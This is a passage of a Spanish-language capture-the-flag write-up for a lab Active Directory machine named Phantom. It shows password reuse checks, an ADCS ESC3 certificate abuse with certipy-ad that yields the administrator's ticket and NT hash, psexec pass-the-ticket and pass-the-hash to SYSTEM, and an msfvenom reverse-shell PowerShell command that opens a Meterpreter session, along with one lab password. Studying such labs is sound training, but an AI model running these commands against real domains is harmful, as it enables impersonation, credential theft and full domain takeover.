+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\t</span>omas:**********
+</span></span></code></pre></div><p>Perfecto, el <strong>usuario tomas</strong> usa la misma contraseña.</p>
+<p>Podemos comprobarlo una vez más con <strong>netexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;tomas&#39;</span> -p <span style="color:#e6db74">&#39;**********&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\t</span>omas:**********
+</span></span></code></pre></div><p>Este usuario también tiene permitido conectarnos a la máquina víctima vía <strong>WinRM</strong>, por lo que usaremos <strong>Evil-WinRM</strong> de nuevo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.56.100 -u &#39;tomas&#39; -p &#39;**********&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tomas\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>phantom\tomas
+</span></span></code></pre></div><h3 id="ESC3">Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template</h3>
+<p>Llegados a este punto, tenemos en nuestro poder las credenciales de 5 usuarios, pero revisando <strong>BloodHound</strong> no encontraremos una forma de escalar privilegios.</p>
+<p>En este punto podemos usar la herramienta <strong>winPEASx64</strong> para buscar alguna vulnerabilidad.</p>
+<p>Puedes descargar <strong>winPEASx64</strong> desde aquí:</p>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a></li>
+</ul>
+<p>Al ejecutarlo desde la sesión del <strong>usuario frank</strong>, nos dirá lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations <span style="color:#66d9ef">for</span> ESC
+</span></span><span style="display:flex;"><span>È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
+</span></span><span style="display:flex;"><span>È Check <span style="color:#66d9ef">for</span> ADCS misconfigurations in the local DC registry
+</span></span><span style="display:flex;"><span>  StrongCertificateBindingEnforcement:  - Allow weak mapping <span style="color:#66d9ef">if</span> SID extension missing, may be vulnerable to ESC9.
+</span></span><span style="display:flex;"><span>  CertificateMappingMethods:  - Strong Certificate mapping enabled.
+</span></span><span style="display:flex;"><span>  IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.
+</span></span><span style="display:flex;"><span>  szOID_NTDS_CA_SECURITY_EXT not disabled <span style="color:#66d9ef">for</span> the CA - not vulnerable to ESC16.
+</span></span><span style="display:flex;"><span>È 
+</span></span><span style="display:flex;"><span>If you can modify a template <span style="color:#f92672">(</span>WriteDacl/WriteOwner/GenericAll<span style="color:#f92672">)</span>, you can abuse ESC4
+</span></span><span style="display:flex;"><span>  Dangerous rights over template: Phantom-DevAuth  <span style="color:#f92672">(</span>Rights: ExtendedRight<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  Dangerous rights over template: User  <span style="color:#f92672">(</span>Rights: WriteProperty,ExtendedRight<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  Dangerous rights over template: UserSignature  <span style="color:#f92672">(</span>Rights: WriteProperty,ExtendedRight<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  Dangerous rights over template: ClientAuth  <span style="color:#f92672">(</span>Rights: WriteProperty,ExtendedRight<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  Dangerous rights over template: EFS  <span style="color:#f92672">(</span>Rights: WriteProperty,ExtendedRight<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Tip: Abuse with tools like Certipy <span style="color:#f92672">(</span>template write -&gt; ESC1 -&gt; enroll<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><p>Esto indica que es posible usar uno de los 5 <strong>templates</strong> para poder escalar privilegios, y entre estos podemos ver uno curioso que se llama <strong>Phantom-DevAuth</strong>.</p>
+<p>Podemos enumerar los <strong>templates</strong> del AD con la herramienta <strong>certipy-ad</strong>; probemos con el <strong>usuario frank</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u <span style="color:#e6db74">&#39;frank&#39;</span> -p <span style="color:#e6db74">&#39;JakiadoJeje123&#39;</span> -dc-ip 192.168.56.100 -vulnerable
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving text output to <span style="color:#e6db74">&#39;20260501191831_Certipy.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote text output to <span style="color:#e6db74">&#39;20260501191831_Certipy.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving JSON output to <span style="color:#e6db74">&#39;20260501191831_Certipy.json&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote JSON output to <span style="color:#e6db74">&#39;20260501191831_Certipy.json&#39;</span>
+</span></span></code></pre></div><p>Puedes leer cualquiera de estos 2 archivos.</p>
+<p>Lo malo, al final nos indica que no pudo encontrar un <strong>template</strong> vulnerable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat 20260501191831_Certipy.txt
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : PHANTOM-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>        Enroll                          : PHANTOM.THL<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate template
+</span></span></code></pre></div><p>Probando con otros usuarios, resulta que con el <strong>usuario tomas</strong> obtenemos un resultado diferente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat 20260430195706_Certipy.txt
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : PHANTOM-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>PHANTOM-DC01-CA, DC<span style="color:#f92672">=</span>PHANTOM, DC<span style="color:#f92672">=</span>THL
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 161A58313EFA72A045F730EFC3CFED39
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2026-02-21 23:23:37+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2031-02-21 23:33:37+00:00
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Certificate Templates
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Template Name                       : Phantom-DevAuth
+</span></span><span style="display:flex;"><span>    Display Name                        : Phantom-DevAuth
+</span></span><span style="display:flex;"><span>    Certificate Authorities             : PHANTOM-DC01-CA
+</span></span><span style="display:flex;"><span>    Enabled                             : True
+</span></span><span style="display:flex;"><span>    Client Authentication               : False
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : PHANTOM.THL<span style="color:#ae81ff">\T</span>omas
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC3                              : Template has Certificate Request Agent EKU set.
+</span></span></code></pre></div><p>Resulta que el <strong>Certificate Template</strong> que mencionó <strong>winPEASx64</strong>, que es <strong>Phantom-DevAuth</strong>, es vulnerable al <strong>ataque ESC3</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>ESC3 Attack</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>ESC3 (Enterprise Security Configuration 3) es una mala configuración en Active Directory Certificate Services (AD CS) que permite a un atacante solicitar un certificado en nombre de otro usuario (impersonación) usando una plantilla vulnerable. Ocurre cuando existe una plantilla de certificado que permite Enrollment Agent y además permite solicitar certificados en nombre de otros usuarios.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo estos 3 blogs que te ayudarán a aplicar y entender este ataque:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank">Hacking Articles - ADCS ESC3: Enrollment Agent Template</a></li>
+<li><a href="https://zonahacking.com/post/esc3" target="_blank">ZonaHacking: ESC3</a></li>
+<li><a href="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4" target="_blank">Active Directory Certificate Services (ADCS – ESC3)</a></li>
+</ul>
+<p>Primero, vamos a generar un certificado válido para nuestro <strong>usuario tomas</strong> usando la <strong>template Phantom-DevAuth</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad req -u <span style="color:#e6db74">&#39;tomas@PHANTOM.THL&#39;</span> -p <span style="color:#e6db74">&#39;**********&#39;</span> -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -target <span style="color:#e6db74">&#39;DC01.PHANTOM.THL&#39;</span> -template <span style="color:#e6db74">&#39;Phantom-DevAuth&#39;</span>
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;tomas@PHANTOM.THL&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;tomas.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;tomas.pfx&#39;</span>
+</span></span></code></pre></div><p>Ahora, utilizamos ese mismo certificado para que podamos generar otro, pero usando el <strong>template User</strong>, que es quien nos permitirá suplantar al <strong>Administrador</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad req -u <span style="color:#e6db74">&#39;tomas@PHANTOM.THL&#39;</span> -p <span style="color:#e6db74">&#39;**********&#39;</span> -dc-ip 192.168.56.100 -ca <span style="color:#e6db74">&#39;PHANTOM-DC01-CA&#39;</span> -target <span style="color:#e6db74">&#39;DC01.PHANTOM.THL&#39;</span> -template <span style="color:#e6db74">&#39;User&#39;</span> -on-behalf-of <span style="color:#e6db74">&#39;administrador&#39;</span> -pfx tomas.pfx
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;administrador@PHANTOM.THL&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrador.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrador.pfx&#39;</span>
+</span></span></code></pre></div><p>Por último, utilizamos el certificado del <strong>Administrador</strong> para que podamos autenticarnos en el <strong>AD</strong> y obtengamos un <strong>TGT</strong> y su <strong>Hash NTLM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad auth -pfx administrador.pfx -username <span style="color:#e6db74">&#39;administrador&#39;</span> -domain <span style="color:#e6db74">&#39;PHANTOM.THL&#39;</span> -dc-ip 192.168.56.100
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN UPN: <span style="color:#e6db74">&#39;administrador@PHANTOM.THL&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;administrador@phantom.thl&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;administrador.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;administrador.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrador&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrador@phantom.thl&#39;</span>:...
+</span></span></code></pre></div><p>Ya con el <strong>TGT</strong> y con el <strong>Hash NTLM</strong>, podemos conectarnos en la máquina víctima usando <strong>impacket-psexec</strong>.</p>
+<p>Probemos con el <strong>TGT</strong>, siendo que primero lo exportamos y luego usamos <strong>impacket-psexec</strong> para autenticarnos usando ese <strong>TGT</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>export KRB5CCNAME=administrador.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>impacket-psexec administrador@DC01.PHANTOM.THL -k -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Requesting shares on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
+</span></span><span style="display:flex;"><span>[*] Uploading file SadReSac.exe
+</span></span><span style="display:flex;"><span>[*] Opening SVCManager on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Creating service wOFw on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Starting service wOFw.....
+</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
+</span></span><span style="display:flex;"><span>[-] Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and then execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.20348.587]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt; whoami</span>
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Ahora probemos con el <strong>Hash NTLM</strong>, donde solo utilizamos el parámetro <code>-hashes</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>impacket-psexec administrador@DC01.PHANTOM.THL -hashes &#39;******&#39;
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Requesting shares on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
+</span></span><span style="display:flex;"><span>[*] Uploading file rTiqzwcC.exe
+</span></span><span style="display:flex;"><span>[*] Opening SVCManager on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Creating service YoQl on DC01.PHANTOM.THL.....
+</span></span><span style="display:flex;"><span>[*] Starting service YoQl.....
+</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
+</span></span><span style="display:flex;"><span>[-] Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and then execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.20348.587]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt; whoami</span>
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Ya dentro, busquemos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt; cd C:\Users\Administrador\Desktop</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt; type root.txt</span>
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><p>Y con esto terminamos la máquina.</p>
+<h3 id="Metasploit">Escalando Privilegios con Metasploit Framework</h3>
+<p>Durante la búsqueda de vulnerabilidades, se pudo encontrar que la máquina víctima es vulnerable al Exploit <code>cve_2024_30085_cloud_files</code>, que lo tenemos como módulo de <strong>Metasploit Framework</strong>.</p>
+<p>Sigamos todo el proceso para utilizar este módulo.</p>
+<h4 id="Meterpreter">Obteniendo una Sesión de Meterpreter</h4>
+<p>Primero, debemos obtener una sesión de <strong>Meterpreter</strong>, así que iniciemos <strong>Metasploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting persistent handler<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span>msf &gt; 
+</span></span></code></pre></div><p>Carguemos y configuremos un listener, usando el módulo <code>/exploit/multi/handler</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf &gt; use /exploit/multi/handler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:443
+</span></span></code></pre></div><p>Para mandar una <strong>Reverse Shell</strong> de <strong>Meterpreter</strong> a nuestro listener, usaremos un comando de <strong>PowerShell</strong> generado con la herramienta <strong>msfvenom</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f psh-cmd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">510</span> bytes
+</span></span><span style="display:flex;"><span>Final size of psh-cmd file: <span style="color:#ae81ff">7571</span> bytes
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Desde cualquier sesión de <strong>Evil-WinRM</strong>, ejecuta ese comando desde que inicia el binario de <strong>PowerShell</strong> hasta el final:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obert<span style="color:#ae81ff">\D</span>ocuments&gt; powershell.exe -nop -w hidden -e aQBmA...
+</span></span></code></pre></div><p>Observa el listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">230982</span> bytes<span style="color:#f92672">)</span> to 192.168.56.100
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:443 -&gt; 192.168.56.100:64507<span style="color:#f92672">)</span> at 2026-04-29 19:11:40 -0600
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : DC01
+</span></span><span style="display:flex;"><span>OS              : Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>10.0 Build 20348<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : es_ES
+</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
+</span></span></code></pre></div><p>Ya tenemos una sesión de <strong>Meterpreter</strong>.</p>
+<h4 id="MetasPrivesc">Escalando Privilegios con el Módulo cve_2024_30085_cloud_files</h4>
+<p>Podemos utilizar el módulo <code>post/multi/recon/local_exploit_suggester</code> para que busque vulnerabilidades en la máquina, así que vamos a cargarlo y a configurarlo:</p>
